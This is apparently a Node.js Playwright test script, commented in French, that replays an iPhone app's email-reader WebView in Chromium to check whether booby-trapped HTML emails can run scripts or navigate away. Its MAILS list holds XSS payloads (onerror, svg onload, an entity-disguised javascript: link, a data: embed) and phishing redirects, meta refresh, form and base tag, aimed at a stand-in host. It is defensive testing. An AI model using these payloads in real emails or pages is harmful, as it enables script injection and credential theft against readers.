/**
 * n°30 — Essai du lecteur de mails de l'iPhone, rejoué dans Chromium.
 *
 * Pour chaque « mail piégé » : on construit la page EXACTE que l'app donne à sa
 * WebView (via charger-lecteur.cjs), on l'ouvre dans Chromium, on injecte le
 * script de mesure comme le fait l'app (hors de la page, à la fin du chargement),
 * puis on regarde :
 *   - si un script du mail a tourné (il écrit « PIRATE-n » dans la console) ;
 *   - si la page a tenté d'aller ailleurs toute seule (redirection, formulaire) ;
 *   - ce que ferait l'app de cette tentative (`onShouldStartLoadWithRequest`) :
 *     ouvrir Safari tout seul, ou bloquer ;
 *   - et, pour un mail normal, que l'affichage marche encore (hauteur envoyée à
 *     l'app, page rendue visible, images chargées, mise à l'échelle).
 *
 * Usage : node essai-lecteur.cjs <dossier src> [--json]
 * Limite : Chromium n'est pas le WebKit de l'iPhone. Ce qui est mesuré ici est le
 * comportement des standards (CSP, meta refresh, formulaires) ; le rendu réel
 * sur iPhone reste à voir par HA.
 */
const { rendre } = require('./charger-lecteur.cjs');
// Playwright n'est pas une dépendance de l'app : sans lui, l'essai le dit et
// saute la partie navigateur (voir essai-n30.test.cjs).
const { chromium } = require('playwright');

// 1 × 1 PNG (orange) pour les images « distantes ».
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

const MAILS = [
  {
    nom: 'script classique',
    html: '<p>Bonjour</p><script>console.log("PIRATE-1")</script>',
  },
  {
    nom: 'image piégée (barre oblique avant onerror)',
    html: '<p>Votre facture</p><img src="x"/onerror="console.log(\'PIRATE-2\')">',
  },
  {
    nom: 'dessin SVG piégé (svg/onload)',
    html: '<p>Bonjour</p><svg/onload="console.log(\'PIRATE-3\')"></svg>',
  },
  {
    nom: 'lien javascript: déguisé (entité HTML), tapé par la personne',
    html: '<p><a id="lien" href="java&#x73;cript:console.log(\'PIRATE-4\')">Voir le document</a></p>',
    taper: '#lien',
  },
  {
    nom: 'redirection automatique (meta refresh) vers une fausse page',
    html: '<meta http-equiv="refresh" content="0;url=https://hameconnage.exemple.test/connexion"><p>Chargement…</p>',
    attendre: 1500,
  },
  {
    nom: 'formulaire non fermé (demande de mot de passe)',
    html: '<p>Session expirée</p><form action="https://hameconnage.exemple.test/vol" method="get"><input name="mdp" value="secret123"><button id="valider">Valider</button>',
    taper: '#valider',
    attendre: 1200,
  },
  {
    nom: 'embed non fermé (page HTML cachée)',
    html: '<p>Pièce jointe</p><embed type="text/html" src="data:text/html,<script>parent.console.log(\'PIRATE-7\');console.log(\'PIRATE-7\')</script>">',
    attendre: 1200,
  },
  {
    nom: 'balise base : un lien relatif part chez le pirate',
    html: '<base href="https://hameconnage.exemple.test/"><p><a id="lien" href="banque/connexion">Votre banque</a></p>',
    taper: '#lien',
    attendre: 800,
  },
];

const MAIL_NORMAL = {
  nom: 'mail normal (newsletter en tableau de 600 px, images, style, lien)',
  html: `<html><head><meta name="viewport" content="width=600"><style>.titre{color:#123456;font-size:22px}</style>
<link rel="stylesheet" href="https://polices.exemple.test/police.css"></head>
<body><table width="600" style="width:600px;border-collapse:collapse"><tr><td>
<img src="https://images.exemple.test/bandeau.png" width="600" height="200" alt="bandeau">
<p class="titre">Les nouveautés d'octobre</p>
<p style="font-family:Georgia">Bonjour, voici notre lettre. <a id="lien" href="https://www.exemple.test/article">Lire l'article</a></p>
<img src="http://ancien.exemple.test/pixel.png" width="1" height="1" alt="">
<img src="data:image/png;base64,${PNG.toString('base64')}" width="40" height="40" alt="logo">
</td></tr></table></body></html>`,
  normal: true,
  taper: '#lien',
};

async function essayer(dirSrc) {
  const navigateur = await chromium.launch();
  const resultats = [];
  for (const mail of [...MAILS, MAIL_NORMAL]) {
    const { props, ouverts } = rendre(dirSrc, mail.html);
    const page = await navigateur.newPage({ viewport: { width: 390, height: 160 } });
    const r = {
      nom: mail.nom,
      scriptsDuMail: [],
      tentativesDeSortie: [],
      decisionsApp: [],
      hauteurs: [],
      violationsCSP: 0,
      imagesChargees: [],
    };
    page.on('console', (m) => {
      const t = m.text();
      if (/PIRATE-\d/.test(t)) r.scriptsDuMail.push(t.match(/PIRATE-\d/)[0]);
      else if (t.startsWith('RNWV:')) r.hauteurs.push(Number(t.slice(5)));
      else if (/Content Security Policy/i.test(t)) r.violationsCSP++;
    });
    // Tout le réseau est simulé : rien ne sort de la machine.
    await page.route('**/*', async (route) => {
      const req = route.request();
      const url = req.url();
      if (req.isNavigationRequest() && req.frame() === page.mainFrame() && !url.startsWith('about:')) {
        r.tentativesDeSortie.push(url);
        // Dans l'app, la WebView ne quitte jamais le mail (le garde renvoie
        // false) : on coupe donc la navigation ici et on juge plus bas ce que
        // l'app en aurait fait.
        return route.abort('aborted');
      }
      if (/\.png($|\?)/.test(url)) {
        r.imagesChargees.push(url);
        return route.fulfill({ status: 200, contentType: 'image/png', body: PNG });
      }
      if (/\.css($|\?)/.test(url)) return route.fulfill({ status: 200, contentType: 'text/css', body: 'p{letter-spacing:0}' });
      return route.fulfill({ status: 404, body: '' });
    });

    await page.setContent(props.source.html, { waitUntil: 'domcontentloaded' });
    // Le script de mesure de l'app : injecté HORS de la page, à la fin du
    // chargement (WKUserScript « AtDocumentEnd » sur iPhone).
    try {
      // Le pont de react-native-webview (posé par l'app, hors de la page), puis
      // le script de mesure. `page.setContent` réécrit le document sans
      // rejouer les scripts d'initialisation : on pose donc le pont ici.
      await page.evaluate("window.ReactNativeWebView = { postMessage: function (d) { console.log('RNWV:' + d); } }; true;");
      await page.evaluate(props.injectedJavaScript);
    } catch (e) {
      r.erreurMesure = String(e.message || e).slice(0, 160);
    }
    if (mail.taper) {
      try {
        await page.click(mail.taper, { timeout: 1500, noWaitAfter: true });
      } catch (e) {
        r.tapImpossible = true;
      }
    }
    await page.waitForTimeout(mail.attendre || 1400);

    // Ce que l'app aurait fait de chaque tentative de sortie.
    const typeDe = (url) => (mail.taper ? (mail.html.includes('<form') ? 'formsubmit' : 'click') : 'other');
    for (const url of r.tentativesDeSortie) {
      const avant = ouverts.length;
      const garde = props.onShouldStartLoadWithRequest({ url, navigationType: typeDe(url), isTopFrame: true });
      r.decisionsApp.push({
        url,
        navigationType: typeDe(url),
        resteDansLaFeuille: garde === true,
        ouvertDansSafari: ouverts.slice(avant),
      });
    }
    if (mail.normal) {
      r.etat = await page.evaluate(() => ({
        opacite: getComputedStyle(document.body).opacity,
        echelle: (document.querySelector('meta[name=viewport]') || {}).content || '',
        largeurImage: (document.querySelector('img[alt=bandeau]') || {}).naturalWidth || 0,
        couleurTitre: getComputedStyle(document.querySelector('.titre')).color,
      }));
    }
    try { r.contenuFinal = (await page.evaluate(() => document.body && document.body.innerText)).slice(0, 40); } catch { r.contenuFinal = '?'; }
    await page.close();
    resultats.push(r);
  }
  await navigateur.close();
  return resultats;
}

module.exports = { essayer, MAILS, MAIL_NORMAL };

if (require.main === module) {
  essayer(process.argv[2]).then((res) => {
    if (process.argv.includes('--json')) return console.log(JSON.stringify(res, null, 1));
    for (const r of res) {
      const safari = r.decisionsApp.flatMap((d) => d.ouvertDansSafari);
      console.log(`\n• ${r.nom}`);
      console.log(`  script du mail exécuté : ${r.scriptsDuMail.length ? 'OUI ' + [...new Set(r.scriptsDuMail)].join(',') : 'non'}`);
      console.log(`  sortie tentée          : ${r.tentativesDeSortie.length ? r.tentativesDeSortie.join(' ') : 'aucune'}`);
      if (r.decisionsApp.length) console.log(`  l'app ouvrirait Safari : ${safari.length ? 'OUI → ' + safari.join(' ') : 'non'} (${r.decisionsApp.map((d) => d.navigationType).join(',')})`);
      console.log(`  hauteur envoyée à l'app: ${r.hauteurs.length ? Math.max(...r.hauteurs) + ' px (' + r.hauteurs.length + ' envois)' : 'AUCUNE'}${r.erreurMesure ? ' ERREUR ' + r.erreurMesure : ''}`);
      if (r.etat) console.log(`  rendu                  : ${JSON.stringify(r.etat)} images=${r.imagesChargees.length}`);
      console.log(`  violations CSP         : ${r.violationsCSP}`);
    }
  });
}
